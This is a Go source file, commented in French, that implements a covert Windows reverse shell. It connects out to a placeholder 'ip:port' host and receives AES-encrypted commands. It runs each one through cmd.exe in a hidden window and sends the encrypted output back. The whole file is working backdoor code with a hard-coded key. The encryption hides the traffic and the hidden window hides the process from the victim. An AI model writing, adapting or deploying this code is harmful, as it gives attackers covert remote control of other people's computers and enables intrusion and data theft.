package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "io"
    "net"
    "os/exec"
    "syscall"
)

// Encryption Key
// 16 ou 24 ou 32 octets pour AES-128 ou AES-192 ou AES-256
var key = []byte("AZERTYUIOP123456")

// La fonction encrypt prend en entree des donnees brutes (data) et une cle de chiffrement (key)
// Elle utilise AES pour chiffrer les donnees
// La fonction retourne les donnees chiffrees ainsi que une erreur (si elle se produit)
func encrypt(data []byte) ([]byte, error) {
    block, err := aes.NewCipher(key) // Cree un nouveau cipher AES avec la cle fournie
    if err != nil {
        return nil, err
    }
    ciphertext := make([]byte, aes.BlockSize+len(data)) // Prepare un espace pour l'IV + les donnees chiffrees
    iv := ciphertext[:aes.BlockSize] // Reserve l'espace de debut pour l'IV
    if _, err = io.ReadFull(rand.Reader, iv); err != nil { // Remplit l'IV avec des donnees aleatoires
        return nil, err
    }
    stream := cipher.NewCFBEncrypter(block, iv) // Cree un stream de chiffrement par bloc avec l'IV
    stream.XORKeyStream(ciphertext[aes.BlockSize:], data) // Chiffre les donnees et les stocke
    return ciphertext, nil
}

// La fonction decrypt prend en entree des donnees chiffrees et une cle de chiffrement (key) 
// Elle extrait d'abord l'IV puis utilise AES pour dechiffrer le reste des donnees
// La fonction retourne les donnees dechiffrees ainsi que une erreur (si elle se produit)
func decrypt(ciphertext []byte) ([]byte, error) {
    block, err := aes.NewCipher(key) // Cree un nouveau cipher AES avec la cle fournie
    if err != nil {
        return nil, err
    }
    if len(ciphertext) < aes.BlockSize { // Verifie si la longueur des donnees chiffrees est suffisante
        return nil, err
    }
    iv := ciphertext[:aes.BlockSize] // Extrait l'IV du debut des donnees chiffrees
    ciphertext = ciphertext[aes.BlockSize:] // Separe l'IV des donnees chiffrees
    stream := cipher.NewCFBDecrypter(block, iv) // Cree un stream de dechiffrement par bloc avec l'IV
    stream.XORKeyStream(ciphertext, ciphertext) // Dechiffre les donnees
    return ciphertext, nil
}


func main() {
    conn, err := net.Dial("tcp", "ip:port") // Tente d'etablir la connexion TCP
    if err != nil {
        return // En cas d'erreur, on arrete l'execution
    }
    defer conn.Close() // Pour fermer la connexion proprement une fois l'arret du prgm

    for { // Boucle infinie pour lire les commandes
        commandBuffer := make([]byte, 4096) // Tampon de 4096 octets utilise pour stocker les donnees lues depuis la connexion
        length, err := conn.Read(commandBuffer)
        if err != nil {
            return // En cas d'erreur, on arrete l'execution
        }
        encryptedCommand := commandBuffer[:length] // Commande chiffree
        command, err := decrypt(encryptedCommand) // Commande dechiffree
        if err != nil {
            return
        }

        // Executer la commande ...
        cmd := exec.Command("cmd.exe", "/C", string(command))
        // ... en arriere plan
        cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
        // Capture la sortie de la commande
        output, err := cmd.CombinedOutput()
        if err != nil {
            output = []byte(err.Error())
        }
	// Chiffre la sortie
        encryptedOutput, err := encrypt(output)
        if err != nil {
            return
        }
        // Envoyer le resultat chiffre au serveur
        conn.Write(encryptedOutput)
    }
}
